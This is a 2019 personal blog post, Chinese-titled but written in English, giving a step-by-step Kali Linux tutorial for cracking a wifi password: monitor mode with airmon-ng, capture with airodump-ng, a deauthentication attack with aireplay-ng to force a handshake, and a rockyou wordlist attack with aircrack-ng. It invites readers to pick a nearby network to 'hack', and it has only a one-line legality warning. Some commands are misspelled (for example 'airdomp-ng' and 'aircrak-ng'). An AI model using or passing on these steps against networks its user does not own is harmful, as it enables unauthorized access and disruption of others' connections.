---
title: kali环境下进行wifi密码爆破
date: 2019-10-19 11:29:05
categories:
- 网络安全
tags:
- 网络安全
- wifi破解
---

#  How to hack wifi passwrod with Kali

Before we start,let me tell you  the reason I write  this post with English. 

There are reason why:
* I wana be a postgraduate  of Ocean University 0f China
* Writing English Posts seem to make me  cool I think


> And this is my first attempt,I know it's a shit.




Let's start!


## Find your wirless Card 's chipset and driver using airmon-ng

open your terminal,and type **airmon-ng**  bash,like this:

![](https://s2.ax1x.com/2019/10/19/Km3nj1.png)


This will show all of wifi cards that can go into monitor mode.

Usaully, wlan0 and echo are interfaces you can shoose

as you can see,wlan0 is my labtop 's wifi interface.

## Put your wifi interface into monitor mode using Arimon-ng



next,type in terminal : **airmon-ng start wlan0**

and type in terminal **ifconfig**.clearly,there is no driver named wlan0 any more,but .... take place of wlan0mon.


### Show the list of wifi at your location


Type in terminal : **airodump-ng wlan0mon**

you can see this:
![](https://s2.ax1x.com/2019/10/19/KmLL4A.png)


next,you should choose the one you most love...and hack it!

( Remember this,Dont do any illegal things!!!!It's most impotant.)


### monitor the wifi and check if someone is already Connected


So,Type in terminal: **airdomp-ng -c (number of channel ) --bssid (the wifi mac adreess) -w (the location of file you want to save)**


here is a sample :

airodump-ng -c 2 --bssid 00:00:00:00:00:00 -w /root/home/test 


![](https://s2.ax1x.com/2019/10/19/KmOPEQ.png)


### Enter the system


Type in terminal **aireplay-ng -0 2 -a (desired router bssid) -c (your own bssid or ethier)  wlan0mon**

And then,you can just waiting for the shakehand between you two,After this,you will do the last thing is Finding the passwrod.

well, all you can do is,use the default worldlists.It's in...


![](https://s2.ax1x.com/2019/10/19/KmOACn.png)


there.

And.. rockyou.text is you want.


so,Type in terminal this : **aircrak-ng -w (the wordlists) (the file last step you created).cap**


> sometimes,the computer may send error like this:
>  Invalid packet capture length -1735227957 - corrupted file?
> It's clearly is we have a wrong cap file,but dont worry ,we can fix this!
> use pcapfix command like this:

![](https://s2.ax1x.com/2019/10/19/KmOmuT.png)



![](https://s2.ax1x.com/2019/10/19/KmOubF.png)


now,waiting for the password!


